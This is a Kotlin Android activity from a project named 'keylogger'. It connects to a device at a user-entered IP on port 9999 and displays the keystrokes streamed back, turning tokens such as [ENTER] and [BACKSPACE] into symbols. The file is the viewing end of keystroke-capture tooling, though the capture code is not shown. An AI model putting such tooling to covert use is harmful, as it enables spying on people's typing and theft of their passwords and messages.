package com.example.keylogger

import android.content.DialogInterface
import android.content.Intent
import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.DataInputStream
import java.io.DataOutputStream
import java.io.InputStreamReader
import java.lang.Thread.sleep
import java.net.Socket

class ClientActivity : AppCompatActivity() {

    // Declare variables for socket, connection status, and UI components
    private var clientSocket: Socket? = null
    private val serverPort = 9999
    private var isConnected = false
    private var reader: DataInputStream? = null
    private lateinit var connectButton: Button
    private lateinit var disconnectButton: Button
    private lateinit var ipInput: EditText
    private lateinit var outputText: TextView
    private lateinit var scrollView: ScrollView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_client)

        // Initialize views from the layout
        connectButton = findViewById(R.id.btnConnect)
        disconnectButton = findViewById(R.id.btnDisconnect)
        ipInput = findViewById(R.id.etServerIP)
        outputText = findViewById(R.id.tvOutput)
        scrollView = findViewById(R.id.scrollView)

        // Logic for the "Connect" button
        connectButton.setOnClickListener {
            val serverIP = ipInput.text.toString().trim()
            if (serverIP.isNotEmpty()) {
                connectButton.isEnabled = false
                connectButton.text = "Connecting..."
                CoroutineScope(Dispatchers.IO).launch { connectToServer(serverIP) }
            } else {
                showToast("Please enter a valid IP address.")
            }
        }

        // Logic for the "Disconnect" button
        disconnectButton.setOnClickListener { disconnectFromServer() }
    }

    // Function to handle connection to the server
    private suspend fun connectToServer(serverIP: String) {
        withContext(Dispatchers.IO) {
            try {
                // Try to create a socket connection with the server IP and port
                clientSocket = Socket(serverIP, serverPort)
                reader = DataInputStream(clientSocket?.getInputStream())
                isConnected = true

                // Update UI to indicate the successful connection
                runOnUiThread {
                    connectButton.text = "Connected"
                    connectButton.isEnabled = false
                    ipInput.isEnabled = false
                    disconnectButton.isEnabled = true
                    appendToOutput("Connected to server at $serverIP")
                }

                // Start listening for incoming messages from the server
                listenForMessages()
            } catch (e: Exception) {
                resetConnection("Connection failed: ${e.message}")
            }
        }
    }

    // Function to continuously listen for messages from the server
    private suspend fun listenForMessages() {
        withContext(Dispatchers.IO) {
            try {
                while (isConnected) {
                    if(reader?.available()!! > 0){
                        val receivedText = reader?.readUTF()!!

                        // Handle server disconnection message
                        if (receivedText == "Server is stopping. You have been disconnected.") {
                            runOnUiThread {
                                showToast("Server has disconnected.")
                            }
                            disconnectFromServer()
                            break
                        }

                        // Append the received message to the UI
                        runOnUiThread { appendToOutput(formatSpecialKeys(receivedText)) }
                    }
                }
            } catch (e: Exception) {
                resetConnection("Error receiving data: ${e.message}")
            }
        }
    }

    // Function to disconnect from the server and reset UI
    private fun disconnectFromServer() {
        CoroutineScope(Dispatchers.IO).launch{
            val dataOutputStream = DataOutputStream(clientSocket?.getOutputStream())
            dataOutputStream.writeUTF("close")
            sleep(2000L)
            isConnected = false
            clientSocket?.close() // Close the socket
            clientSocket = null
            reader?.close() // Close the reader
            reader = null
            resetConnection("Disconnected from server")
        }
    }

    // Function to reset connection state and update UI
    private fun resetConnection(message: String) {
        runOnUiThread {
            connectButton.text = "Connect"
            connectButton.isEnabled = true
            disconnectButton.isEnabled = false
            ipInput.isEnabled = true
            appendToOutput(message)
        }
    }

    // Function to navigate back to MainActivity
    private fun navigateToMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
        finish()  // Close ClientActivity
    }

    // Function to append the message to the output TextView
    private fun appendToOutput(message: String) {
        outputText.append("$message\n")
        scrollView.post { scrollView.fullScroll(ScrollView.FOCUS_DOWN) }
    }

    // Function to format special key names into symbols
    private fun formatSpecialKeys(input: String): String {
        return when (input) {
            "[BACKSPACE]" -> "⌫"
            "[ENTER]" -> "↵\n"
            "[SPACE]" -> "␣"
            "[TAB]" -> "⇥"
            "[SHIFT]" -> "⇧"
            "[CAPS_LOCK]" -> "⇪"
            "[ALT]" -> "⌥"
            "[CTRL]" -> "⌃"
            else -> input
        }
    }

    // Function to show a toast message
    private fun showToast(message: String) {
        runOnUiThread { Toast.makeText(this, message, Toast.LENGTH_SHORT).show() }
    }

    // Override the back button to show a confirmation dialog if connected
    override fun onBackPressed() {
        if (isConnected) {
            // Show confirmation dialog
            AlertDialog.Builder(this)
                .setTitle("Disconnect")
                .setMessage("Are you sure you want to disconnect and go back?")
                .setPositiveButton("Yes") { dialog, _ ->
                    disconnectFromServer()
                    dialog.dismiss()
                }
                .setNegativeButton("No") { dialog, _ ->
                    dialog.dismiss()
                }
                .create()
                .show()
        } else {
            super.onBackPressed()  // Just go back if not connected
        }
    }

    // Override onDestroy to ensure proper cleanup
    override fun onDestroy() {
        super.onDestroy()
        disconnectFromServer()  // Disconnect from server if activity is destroyed
    }
}
